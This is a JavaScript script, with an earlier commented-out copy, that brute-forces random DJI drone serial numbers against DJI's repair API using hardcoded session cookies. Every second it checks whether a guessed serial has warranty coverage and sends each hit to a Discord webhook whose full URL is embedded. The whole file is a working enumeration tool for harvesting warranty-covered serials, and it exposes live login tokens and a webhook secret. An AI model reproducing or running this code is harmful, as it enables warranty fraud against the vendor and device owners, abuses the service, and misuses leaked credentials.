

import fetch from 'node-fetch';

const og = "3N3BH7F002038E";

import { Webhook, MessageBuilder } from 'discord-webhook-node';
const hook = new Webhook("https://discord.com/api/webhooks/886646524833046538/l6loHU1AHGcSZX-EL4dS0szq9IWScAk915qnzxHqefUtA31JAT_v4KI_M0-9NvXwFq6F");



const constval = "163CH";
const constval2 = "R0A";

const alphabet = ['A', 'B', 'C', 'D', 'F', 'E', 'Y', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'Z', 'X'];
const ranNum = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];




function run() {

    setInterval(async () => {


        try {

            const randomLetterOne = Math.floor(Math.random() * 26);
            const randomLetterTwo = Math.floor(Math.random() * 26);
            const randomLetterThree = Math.floor(Math.random() * 26);

            const randomNumberOne = Math.floor(Math.random() * 10)
            const randomNumberTwo = Math.floor(Math.random() * 10)
            const randomNumberThree = Math.floor(Math.random() * 10)

            const uniqueSerial = constval + ranNum[randomNumberOne] + alphabet[randomLetterOne] + constval2 + ranNum[randomNumberTwo] + alphabet[randomLetterTwo] + alphabet[randomLetterThree] + ranNum[randomNumberThree];

            const data = await fetch(`https://repair.dji.com/api/v1/SelfRepair/GetUserSNProduct?snCode=${uniqueSerial}&formId=`, {
                "headers": {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7",
                    "apppage": "repair",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "sec-ch-ua": "\"Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "traceparent": "00-59f07ee28548ab91f47682f8a3957757-9db38a46cfd0dfdc-01",
                    "cookie": "lang=en; _meta_key=US_SKO7unSXHZ8GkVNXzpiw5c-nYWDMH75fi0w-CvHk7hef6dGFKnnD4-CGUjuvOLwbqaMmZCjt8PgdP1rA7Cqh4SYpaqs9Y6hG89OziBtnFQA; _ticket_key=US_wdmhFPhERKZII3cJ3PLkQTB_OthV59o2-qdlkaAh7kmnXGoQLRMq4NCvh-Rr6dF9eHrespq3k51NQCcjxN2Mp1B-6Nn_5grkAXTBLsdLSlVR2taghZ_Q8f7y-5CPVJl7CcSGfpdypr4NRi_PIf2NEg; Repair_Login=true"
                },
                "referrer": "https://repair.dji.com/repair/process/device",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": null,
                "method": "GET",
                "mode": "cors"
            });

            const res = await data.json();
            console.log(res.Value.isCare)
            if (res.Value.isCare === true) {


                const productInfo = {

                    serial: res.Value.productSN,
                    productname: res.Value.productName,
                    productno: res.Value.productNo,
                    hasWarranty: res.Value.isCare
                }

                const embed = new MessageBuilder()
                    .setTitle('DJI Serials')
                    .addField('SERIAL: ', productInfo.serial, true)
                    .addField('PRODUCT NAME: ', productInfo.productname)
                    .addField('PRODUCT NUMBER: ', productInfo.productno)
                    .addField('Does it have Warranty?: ', productInfo.hasWarranty)
                    .setColor('#00b0f4')
                    .setThumbnail('https://www1.djicdn.com/dps/de46652dd99c67d4f8d17607e3bf0dce.jpg')
                    .setDescription('SERIAL HAS BEEN GENERATED SUCCESSFULLY')
                    .setTimestamp();

                hook.send(embed);
                
                console.log("WEBHOOK HAS BEEN SENT")

            }


        } catch (e) {
            console.log(e);
        }


    }, 1000)

}


function run1() {

    setInterval(async () => {


        try {

            const randomLetterOne = Math.floor(Math.random() * 26);
            const randomLetterTwo = Math.floor(Math.random() * 26);
            const randomLetterThree = Math.floor(Math.random() * 26);

            const randomNumberOne = Math.floor(Math.random() * 10)
            const randomNumberTwo = Math.floor(Math.random() * 10)
            const randomNumberThree = Math.floor(Math.random() * 10)

            const uniqueSerial = constval + ranNum[randomNumberOne] + alphabet[randomLetterOne] + constval2 + ranNum[randomNumberTwo] + ranNum[randomNumberThree] + alphabet[randomLetterTwo] + alphabet[randomLetterThree];

            const data = await fetch(`https://repair.dji.com/api/v1/SelfRepair/GetUserSNProduct?snCode=${uniqueSerial}&formId=`, {
                "headers": {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7",
                    "apppage": "repair",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "sec-ch-ua": "\"Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "traceparent": "00-59f07ee28548ab91f47682f8a3957757-9db38a46cfd0dfdc-01",
                    "cookie": "lang=en; _meta_key=US_SKO7unSXHZ8GkVNXzpiw5c-nYWDMH75fi0w-CvHk7hef6dGFKnnD4-CGUjuvOLwbqaMmZCjt8PgdP1rA7Cqh4SYpaqs9Y6hG89OziBtnFQA; _ticket_key=US_wdmhFPhERKZII3cJ3PLkQTB_OthV59o2-qdlkaAh7kmnXGoQLRMq4NCvh-Rr6dF9eHrespq3k51NQCcjxN2Mp1B-6Nn_5grkAXTBLsdLSlVR2taghZ_Q8f7y-5CPVJl7CcSGfpdypr4NRi_PIf2NEg; Repair_Login=true"
                },
                "referrer": "https://repair.dji.com/repair/process/device",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": null,
                "method": "GET",
                "mode": "cors"
            });

            const res = await data.json();
            console.log(res.Value.isCare)
            if (res.Value.isCare === true) {


                const productInfo = {

                    serial: res.Value.productSN,
                    productname: res.Value.productName,
                    productno: res.Value.productNo,
                    hasWarranty: res.Value.isCare
                }

                const embed = new MessageBuilder()
                    .setTitle('DJI Serials')
                    .addField('SERIAL: ', productInfo.serial, true)
                    .addField('PRODUCT NAME: ', productInfo.productname)
                    .addField('PRODUCT NUMBER: ', productInfo.productno)
                    .addField('Does it have Warranty?: ', productInfo.hasWarranty)
                    .setColor('#00b0f4')
                    .setThumbnail('https://www1.djicdn.com/dps/de46652dd99c67d4f8d17607e3bf0dce.jpg')
                    .setDescription('SERIAL HAS BEEN GENERATED SUCCESSFULLY')
                    .setTimestamp();

                hook.send(embed);

                console.log("WEBHOOK HAS BEEN SENT")

            }


        } catch (e) {
            console.log(e);
        }


    }, 1000)

}

run();
run1();

/*import fetch from 'node-fetch';
import fs from 'fs';
const og = "3N3BH7F002038E";

import { Webhook, MessageBuilder } from 'discord-webhook-node';
const hook = new Webhook("https://discord.com/api/webhooks/886646524833046538/l6loHU1AHGcSZX-EL4dS0szq9IWScAk915qnzxHqefUtA31JAT_v4KI_M0-9NvXwFq6F");




const constval = "163CH";
const constval2 = "R0A";

const alphabet = ['A','B','C','D','F','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','Z','X'];
const ranNum = [0,1,2,3,4,5,6,7,8,9];


(async() => {

    setInterval(async () => {



    try {


    const randomLetterOne = Math.floor(Math.random() * 26);
    const randomLetterTwo = Math.floor(Math.random() * 26);
    const randomLetterThree = Math.floor(Math.random() * 26);



    const randomNumberOne = Math.floor(Math.random() * 10)
    const randomNumberTwo = Math.floor(Math.random() * 10)
    const randomNumberThree = Math.floor(Math.random() * 10)

    const uniqueSerial = constval + ranNum[randomNumberOne] + alphabet[randomLetterOne] + constval2 + ranNum[randomNumberTwo] + ranNum[randomNumberThree] + alphabet[randomLetterTwo] + alphabet[randomLetterThree] ;


    const body = await fetch(`https://repair.dji.com/api/v1/SelfRepair/GetUserSNProduct?snCode=${uniqueSerial}&formId=`, {
    "headers": {
    "accept": "application/json, text/plain, *",
        "accept-language": "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7",
        "apppage": "repair",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "traceparent": "00-59f07ee28548ab91f47682f8a3957757-9db38a46cfd0dfdc-01",
        "cookie": "lang=en; _meta_key=US_SKO7unSXHZ8GkVNXzpiw5c-nYWDMH75fi0w-CvHk7hef6dGFKnnD4-CGUjuvOLwbqaMmZCjt8PgdP1rA7Cqh4SYpaqs9Y6hG89OziBtnFQA; _ticket_key=US_wdmhFPhERKZII3cJ3PLkQTB_OthV59o2-qdlkaAh7kmnXGoQLRMq4NCvh-Rr6dF9eHrespq3k51NQCcjxN2Mp1B-6Nn_5grkAXTBLsdLSlVR2taghZ_Q8f7y-5CPVJl7CcSGfpdypr4NRi_PIf2NEg; Repair_Login=true"
},
"referrer": "https://repair.dji.com/repair/process/device",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "method": "GET",
    "mode": "cors"
});


const res = await body.json()


console.log(res.Value.isCare)


if (res.Value.isCare === true){


    const productInfo = {

        serial: res.Value.productSN,
        productname: res.Value.productName,
        productno: res.Value.productNo,
        hasWarranty: res.Value.isCare
    }

    const embed = new MessageBuilder()
        .setTitle('DJI Serials')
        .addField('SERIAL: ', productInfo.serial, true)
        .addField('PRODUCT NAME: ', productInfo.productname)
        .addField('PRODUCT NUMBER: ', productInfo.productno)
        .addField('Does it have Warranty?: ', productInfo.hasWarranty)
        .setColor('#00b0f4')
        .setThumbnail('https://www1.djicdn.com/dps/de46652dd99c67d4f8d17607e3bf0dce.jpg')
        .setDescription('SERIAL HAS BEEN GENERATED SUCCESSFULLY')
        .setTimestamp();

    hook.send(embed);


    console.log(productInfo)


    }


    } catch (e) {
        console.log(e);
    }


    }, 500)
})()*/
